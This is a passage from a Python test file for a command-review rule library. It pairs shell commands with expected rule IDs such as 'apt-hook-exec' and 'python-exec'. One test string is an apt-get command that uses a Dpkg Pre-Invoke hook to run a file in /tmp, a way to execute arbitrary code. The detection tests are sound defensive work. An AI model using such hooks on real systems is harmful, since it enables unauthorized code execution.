    ("apt-get -qqo Dpkg::Pre-Invoke::=/tmp/x install htop", "apt-hook-exec"),
    ("python3 -W ignore -c 'print(1)'", "python-exec"),
    ("python3 -X dev -c 'x'", "python-exec"),
    ("python3 -W ignore x.py", None),
])
def test_review_minors(library, text, rule_id):
    assert rule_of(library, text) == rule_id
